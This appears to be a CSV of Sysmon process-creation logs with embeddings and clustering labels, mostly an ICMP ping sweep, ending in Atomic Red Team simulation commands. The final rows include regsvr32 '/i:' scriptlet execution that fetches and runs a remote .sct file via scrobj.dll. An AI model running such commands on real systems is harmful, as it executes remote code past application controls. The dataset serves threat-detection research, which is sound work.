Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-07-19T14:53:07.912922Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.187,"[-0.02249878  0.029758    0.00892033 ...  0.00523174 -0.01024862
 -0.00751286]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:08.521156Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.188,"[-0.01918466  0.03007513  0.01247993 ...  0.01980407 -0.01155467
 -0.00536786]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:09.043000Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.189,"[-0.02418009  0.02875274  0.01189723 ...  0.01226903 -0.00991714
  0.00097591]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:09.515226Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.190,"[-0.02088935  0.02967835  0.0062726  ...  0.01214195 -0.00586621
 -0.01066996]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:10.036308Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.191,"[-0.02471448  0.02927805  0.00969518 ...  0.00910142 -0.00677526
 -0.00606203]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:10.556027Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.192,"[-0.03291972  0.0417409   0.01690399 ...  0.00370982 -0.01527453
 -0.00481535]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:11.022720Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.193,"[-0.01891741  0.03178928  0.00928993 ...  0.00713262 -0.01302206
 -0.00506849]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:11.504021Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.194,"[-0.02135722  0.03279829  0.01295744 ...  0.00441236 -0.00644554
 -0.00569613]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:12.040416Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.195,"[-0.02114219  0.04158298  0.00788759 ... -0.00044791 -0.012464
 -0.00293512]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:12.537703Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.196,"[-0.02719881  0.03158208  0.00881493 ...  0.00738636 -0.0118804
 -0.00549306]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:13.022731Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.197,"[-0.02322528  0.03232621  0.01141664 ...  0.00391134 -0.01119683
 -0.00310245]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:13.509249Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.198,"[-0.02355906  0.03042826  0.01304154 ...  0.00936608 -0.01017144
 -0.00054959]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:14.020058Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.199,"[-0.02946901  0.0389753   0.01237902 ...  0.00432202 -0.0148513
 -0.00437356]",16,39,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:14.513998Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.200,"[-0.02997226  0.03535883  0.005459   ...  0.00906141 -0.01229064
 -0.00070144]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:15.001936Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.201,"[-0.02421724  0.03174931  0.00868917 ...  0.00604613 -0.01039755
 -0.00277176]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:15.518184Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.202,"[-0.02102561  0.03712362  0.01371212 ...  0.00769642 -0.0163077
  0.00259425]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:16.026970Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.203,"[-0.0173365   0.03751796  0.0159944  ...  0.00639683 -0.01347737
 -0.00107274]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:16.521608Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.204,"[-0.0117549   0.03567064  0.01531659 ...  0.00968225 -0.01231024
 -0.00080848]",16,42,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:17.037718Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.205,"[-0.0144397   0.03808947  0.01436717 ...  0.00568084 -0.01044341
 -0.00412544]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:17.438835Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.206,"[-0.01740865  0.03768598  0.02355328 ...  0.01538756 -0.01571311
  0.0063473 ]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:18.043759Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.207,"[-0.0170413   0.03702063  0.01866228 ...  0.01090188 -0.01042305
  0.00072915]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:18.544507Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.208,"[-0.01570284  0.04576622  0.02022401 ...  0.00731112 -0.00574377
  0.00135597]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:19.012391Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.209,"[-0.01229769  0.0340265   0.01625345 ...  0.01078166 -0.01191023
  0.00431259]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:19.546167Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.210,"[-0.02196964  0.03410439  0.0096706  ...  0.01196518 -0.00599536
  0.00182608]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:20.009002Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.211,"[-0.02764858  0.02567655  0.00815386 ...  0.00701715 -0.00350192
 -0.00384315]",16,13,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:20.571708Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.212,"[-0.02648444  0.03693708  0.00821427 ...  0.00609178 -0.00440419
 -0.00191461]",16,13,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:21.020943Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.213,"[-0.01717493  0.0312783   0.00530468 ...  0.00567285 -0.00608753
 -0.00148024]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:21.520858Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.214,"[-0.01013831  0.03166753  0.00660303 ...  0.00709808 -0.00673601
 -0.00325661]",16,42,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:22.035442Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.215,"[-0.02280913  0.03947584  0.00605268 ...  0.0051011  -0.00340836
  0.00137465]",16,194,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:22.520782Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.216,"[-0.0298476   0.03236363  0.01192812 ...  0.00820679 -0.0043425
 -0.00714959]",16,194,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:23.011338Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.217,"[-0.0285565   0.0292105   0.01190364 ...  0.01187645 -0.00635767
 -0.00348187]",16,194,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:23.546013Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.218,"[-0.01804574  0.02854374  0.01812576 ...  0.01507112 -0.00259302
 -0.00329595]",16,194,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:23.993414Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.219,"[-0.02561942  0.02911135  0.01671409 ...  0.00875809 -0.0035333
 -0.00078115]",16,194,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:24.504866Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.220,"[-0.02608454  0.02798437  0.00292875 ...  0.00683752 -0.00791238
 -0.00640417]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:25.008134Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.221,"[-0.02829701  0.02724865  0.00373879 ...  0.00432133 -0.00607919
 -0.0045624 ]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:25.544561Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.222,"[-0.03072969  0.03388301  0.00858726 ...  0.00506449 -0.00995036
 -0.00429894]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:26.004364Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.223,"[-0.02253995  0.03173338  0.00571878 ...  0.0103278  -0.01517542
 -0.0050749 ]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:26.430802Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.224,"[-0.01928454  0.03473692  0.01204186 ...  0.00478445  0.00139032
 -0.00297774]",16,42,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:27.009926Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.225,"[-0.02458605  0.04281091  0.01186994 ...  0.00416463 -0.00560404
 -0.00634377]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:27.555029Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.226,"[-0.02744685  0.03815285  0.01301234 ...  0.00767654 -0.00720015
 -0.01116268]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:28.035650Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.227,"[-0.02278965  0.03899855  0.01140564 ...  0.00643397 -0.00825198
 -0.00804993]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:28.511670Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.228,"[-0.01482131  0.04104488  0.01382819 ...  0.01063659 -0.01052161
 -0.00456917]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:29.009976Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.229,"[-0.0189717   0.04137599  0.01303149 ...  0.00812695 -0.01323947
 -0.00209164]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:29.534904Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.230,"[-0.01497573  0.0317989   0.00560597 ...  0.00961668 -0.0060785
 -0.0102261 ]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:30.034506Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.231,"[-0.0166002   0.02996269  0.00478469 ...  0.00782925 -0.00130453
 -0.00253921]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:30.521002Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.232,"[-0.02747262  0.04072054  0.01711269 ...  0.00349051 -0.00559059
 -0.0098412 ]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:31.013359Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.233,"[-0.01898948  0.03060499  0.00848487 ...  0.00968586 -0.01605557
 -0.0096178 ]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:31.530608Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.234,"[-0.01105646  0.03349946  0.01389124 ...  0.00127749  0.00063944
 -0.00761746]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:32.058761Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.235,"[-0.01371843  0.0379646   0.00753297 ...  0.00566116  0.00176294
 -0.00942712]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:32.614767Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.236,"[-0.02147038  0.03693964  0.01045701 ...  0.00971651 -0.00322989
 -0.01178237]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:33.018882Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.237,"[-0.01391549  0.02968083  0.004382   ...  0.00949258 -0.00103503
 -0.01353565]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:33.548567Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.238,"[-0.00651024  0.03125007  0.0103682  ...  0.01268395 -0.00141
 -0.00944797]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:34.005414Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.239,"[-0.01230402  0.03128661  0.01061732 ...  0.01055412 -0.00999685
 -0.00426546]",16,206,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:34.556142Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.240,"[-0.0090779   0.03568261  0.00878109 ...  0.00962327 -0.00976094
 -0.00566457]",16,82,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:35.024667Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.241,"[-0.01937296  0.03220118  0.01552226 ...  0.00164627 -0.0118789
 -0.01015051]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:35.559595Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.242,"[-0.0156773   0.03131534  0.01757568 ...  0.00744728 -0.00432141
 -0.00378526]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:36.025921Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.243,"[-0.01172098  0.03489864  0.01722468 ...  0.00359535 -0.00967412
 -0.00219298]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:36.536599Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.244,"[-0.01077437  0.02870563  0.01410457 ...  0.00648146 -0.01290966
 -0.00709299]",16,42,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:37.012815Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.245,"[-0.01166702  0.03621471  0.01443831 ...  0.00628203 -0.01126706
 -0.00533127]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:37.505228Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.246,"[-0.01590567  0.03296225  0.01210895 ...  0.01564829 -0.01452437
  0.00222152]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:38.043576Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.247,"[-0.02001727  0.03525712  0.01797344 ...  0.01182612 -0.00726917
 -0.00869682]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:38.588994Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.248,"[-0.01365995  0.03946916  0.01441198 ...  0.01247493 -0.00603836
 -0.00458018]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:39.024685Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.249,"[-0.02305363  0.03262257  0.01277179 ...  0.0111398  -0.00990253
 -0.00247339]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:39.518485Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.250,"[-0.01986563  0.02851074  0.01210202 ...  0.00722103 -0.00413355
 -0.00451558]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:40.006782Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.251,"[-0.02033527  0.03383475  0.00400856 ...  0.00390542 -0.00528074
 -0.01138465]",16,177,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:40.535082Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.252,"[-0.02445788  0.03827304  0.01599598 ...  0.00574433  0.00162959
 -0.00913864]",16,218,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:40.982570Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.253,"[-0.01256932  0.03198416  0.00778629 ...  0.00934803 -0.00490269
  0.00179248]",16,246,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:41.530685Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ping  -n 1 -w 100 192.168.1.254,"[-0.00825645  0.03198905  0.00372663 ...  0.00635463 -0.00156561
  0.00215679]",16,42,Automated ICMP ping sweep targeting multiple hosts for network discovery.,4
2019-07-19T14:53:42.276408Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""arp -a""","[-0.0117205   0.0362585   0.01128185 ...  0.01573047 -0.00214311
 -0.00092083]",0,155,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:42.301844Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,arp  -a,"[-0.02147141  0.01606176 -0.0049227  ...  0.00965834 -0.00453014
 -0.00439693]",0,155,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:42.815966Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll""","[ 0.00746624 -0.00986197  0.01581101 ...  0.00551911  0.00457749
  0.00610612]",0,37,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:42.841951Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,regsvr32.exe  /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll,"[ 0.0031723  -0.00872555  0.01315931 ...  0.00109938  0.01012131
  0.00274108]",0,37,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:43.445040Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\calc.exe"" ","[-0.01136218  0.00967676  0.03059488 ...  0.02083431 -0.00336988
 -0.00370811]",0,47,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:44.026061Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll""","[ 0.01360738 -0.00535497  0.01456748 ...  0.00966777  0.01166066
  0.00228601]",0,37,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:53:44.054072Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll,"[ 0.00561422 -0.00840646  0.00968671 ...  0.0062647   0.01688665
  0.00164648]",0,37,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
